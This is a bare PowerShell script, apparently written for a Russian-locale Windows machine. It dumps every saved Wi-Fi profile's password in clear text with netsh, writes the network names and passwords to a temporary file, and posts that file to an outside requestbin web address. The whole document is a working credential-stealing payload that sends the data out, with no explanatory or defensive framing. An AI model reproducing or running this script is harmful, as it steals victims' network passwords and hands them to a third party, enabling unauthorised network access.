$wifi = (netsh wlan show profiles) | Select-String "\:(.+)$" | %{$name=$_.Matches.Groups[1].Value.Trim(); $_} | %{(netsh wlan show profile name="$name" key=clear)} | Select-String "Содержимое ключа\W+\:(.+)$" | %{$pass=$_.Matches.Groups[1].Value.Trim(); $_} | %{[PSCustomObject]@{ ESSID=$name;PASS=$pass }} | Format-Table -AutoSize
$url = "https://requestbin.labs.degica.com/zoe2kszo"
Start-Sleep -Seconds 1
$wifi | Out-File tmp.txt
Start-Sleep -Seconds 1
$data = Get-Content ./tmp.txt
Start-Sleep -Seconds 1
Invoke-RestMethod -Uri $url -Method Post -Body $data